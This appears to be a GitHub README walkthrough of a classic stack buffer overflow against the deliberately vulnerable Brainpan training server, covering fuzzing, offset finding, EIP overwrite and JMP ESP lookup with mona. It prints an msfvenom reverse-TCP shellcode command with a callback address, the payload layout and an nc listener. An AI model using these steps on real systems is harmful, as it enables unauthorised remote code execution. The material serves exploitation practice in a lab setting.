<h1>Hacksudo Brainpan BOF server </h1>
visit brainpan 1 box walktrhough 
https://leetvilu.blogspot.com/2021/03/brainpan-1-box-walkktrhough-hacksudocom.html
<h2>Steps</h2></br>
All BOF step are given bellow check clearfully 
<h3>1 spiking</n>
<br>2 fuzzing</n>
<br>3 finding the offset
<br>4 overwriting the EIP
<br>5 finding bad characters
<br>6 finding the right modules
<br>7 Generating Shellcode</h3></br></br></br></br></br>
i hope so you understand my Wrteup :- vishal waghmare
<p><h2>1 Spiking </h2></p>
First make sure Your firewall real protection turn off
Now run brainpan server as admin
use your spiking.spk to find Vulnerability 
script is --> 
<b> s_readline();
"s_string("TRUN ");"
s_string_variable("0");
</b>

Now use generic_send_tcp (target)IP (target)PORT spiking.spk 0 0
(if server crash ? boom you  succeed 

<h2> 2 fuzzing</h2>
Now time to find Number of size buffer which crash server 
(use chmod +x * )
 ./brainpan.py 192.168.43.161 9999 ( here your brainpan server will crash and you will get avarage amount o buffer size
Now create pattern , why ? to find exact number of Buffer size
First create unic pattern using metasploit tool
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500( here your last (brainpan.py) crash avarage number , which 
must greater.  
 Now use offsetcalc.py to find lenght which you will use later to  find offset which is our exact buffer size in byte :D 
 ./offsetcalc.py IP PORT
get EIP value ? now use it at offset

<h2> 3 finding the offset</h2>
find offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 35724134
[*] Exact match at offset 524
 boom ?? we get Exact Number of size which is 524

<h2>4. overwriting the EIP</h2>
Now Verify EIP Overwrite, add B*4 and check debuger print 42424242 at EIP 
./brainpanEIPWt.py IP PORT
 YES --> ok great

<h2>5. finding bad characters</h2>
Now find Bad chars which is use while create shellcode , actualy  we dont need to find  bad chars in this servers, but dont skip this step go head
and just do practice ;) 
 ./brainpanBadChard.py IP PORT
remember how to find Bad chars ? opps no ? dont worry just do hard else catch me on insta i'll explain you 
https://instagram.com/realvilu
:)

<h2>6. finding the right modules</h2>
Downloaded Mona modules ? . no ? download it  --> https://github.com/corelan/mona and add it at exact place
use command 
!mona mudules
!mona find -s "\xff\xe4" -m brainpan.dll
now find base value note it down
and make sure ur JMP ESP Using nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

now do make sure you selected your JMP ESP make sure your base value is right 

fire offsetverify.py
./offsetverify.py IP PORT
make sure its work you controling EIP or not if yes then go head and do shell using shellcode
control EIP done

<h2>7. Generating Shellcode</h2>
now generarte shellcode 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.216 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"(make sure your bad chars)

"A" * 524 + (JMP ESP value) "\xf3\x12\x17\x31"  (reverse way) +  "\x90" * 8 ( this is nops value minimum which make space between shell and JMP ESP+ shell 
make sure your nc is ready
 nc -lvnp 443 
and now fire your final code 
./finalexploit.py IP PORT

boom you will get shell 
if not then sorry please recheck all step clearly 
thanks i hope you love this repo :D 
<h1>love you guys thanks for watching </h1>
<b>
<br>visit our official Website : https://hacksudo.com</br>
<br>hacksudo Linkedin https://www.linkedin.com/in/hack-sudo-230a871b3/</br>
<br> visit linkedin https://www.linkedin.com/in/realvilu </br>
<br><h2>Author Vishal waghmare</h2></br>
<h3>Happy Hacking :)</h3>
